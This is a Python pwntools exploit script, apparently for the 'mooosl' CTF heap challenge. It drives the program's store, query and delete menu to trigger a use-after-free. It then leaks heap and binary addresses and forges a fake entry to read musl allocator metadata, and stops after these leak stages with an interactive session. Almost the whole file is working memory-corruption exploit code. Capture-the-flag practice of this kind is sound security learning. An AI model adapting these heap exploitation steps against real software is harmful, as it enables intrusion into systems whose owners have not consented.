#!/usr/bin/python3
from pwn import u64, p64, process, context, u16
from time import sleep
from binascii import unhexlify

def exploit():
    context.log_level = 'debug'
    p = process('./mooosl')

    def store(key, val):
        p.recv()
        p.sendline("1")
        p.recv()
        p.sendline(str(len(key)+1))
        p.recv()
        p.sendline(str(key))
        p.recv()
        p.sendline(str(len(val)+1))
        p.recv()
        p.sendline(val)

    def query(key):
        p.recv()
        p.sendline("2")
        p.recv()
        p.sendline(str(len(key)+1))
        p.recv()
        p.sendline(str(key))
        return p.recvline()

    def delete(key):
        p.recv()
        p.sendline("3")
        p.recv()
        p.sendline(str(len(key)+1))
        p.recv()
        p.sendline(str(key))
        return(p.recvline())

    for i in range(13):
        store(str(i), str(i))

    if (delete("6") == b'err\n'):
        print("Error deleting key:value pair")
        exit(1)
    
    store("VqkuA", "A" * 0x30)
    store("UUbtx", "BBB")
    delete("VqkuA")
    delete("UUbtx")
    store("UUbtxx", "x")
    leak = query("VqkuA")[5:]
    print(leak)
    aaaax_ptr_addr = u64(unhexlify(leak[0:16]))
    print(hex(aaaax_ptr_addr))
    # small mallocs starts at a fixed location in the heap, so pointer address is at a known offset 
    # if the relative storage location (group, number) is known 
    text_start = aaaax_ptr_addr - 0xce00
    bss_start = text_start + 0x4000
    print(hex(bss_start))


    delete('7')
    store('7', p64(aaaax_ptr_addr) + p64(bss_start) + p64(len("UUbtx")) + p64(0x9000) + p64(0x00000000a0686f9d) + p64(0)) #0x30 bytes
    leak = query('UUbtx')
    leak = unhexlify(leak.split(b':')[1].strip())
    offset = u16(leak[0x8e00 - 2:0x8e00])
    meta = u64(leak[0x8e00 - 0x10 - offset * 0x10:0x8e00 - 0x10 - offset * 0x10 + 8])
    area = meta & ~0xfff
    print('meta %#x area %#x' % (meta, area))
    print(hex(offset))


    print(p.pid)
    sleep(4)
    p.interactive()



if __name__== "__main__":
    exploit()